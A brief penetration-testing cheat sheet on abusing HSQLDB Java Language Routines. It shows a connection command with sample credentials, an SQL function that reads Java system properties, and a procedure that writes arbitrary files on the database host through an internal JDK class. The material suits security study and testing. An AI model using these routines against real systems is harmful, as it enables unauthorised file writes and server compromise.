
We can call static methods of a Java class from HSQLDB using Java Language Routines (JRT).
Like any Java program, the class needs to be in the application's classpath.

JRTs can be defined as functions or procedures. 
Functions can be used as part of a normal SQL statement if the Java method returns a variable.

If the Java method we want to call returns void, we need to use a procedure. 
Procedures are invoked with a CALL statement.

### Connecting to HSQLDB databases

- https://sourceforge.net/projects/hsqldb/files/hsqldb/hsqldb_2_5/

```bash
java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://10.10.10.10:9001/CRX --user login --password secretpass99
```

### Database functions

Reading a system property:

 - https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html

```sql
CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR 
  LANGUAGE JAVA 
  DETERMINISTIC NO SQL
  EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
  
VALUES(systemprop('java.class.path'))
```

### Database procedures

Writing a file on the remote system:

```sql
CREATE PROCEDURE writeBytesToFilename(IN fileName VARCHAR, IN fileContent VARBINARY(2000))
  LANGUAGE JAVA 
  DETERMINISTIC NO SQL
  EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```

Encode the file content with Burp as ASCII hex:

```sql
call writeBytesToFilename('test.txt', cast ('497420776f726b656421' AS VARBINARY(1024)))
call writeBytesToFilename('test.txt', cast ('' AS VARBINARY(1024)))
```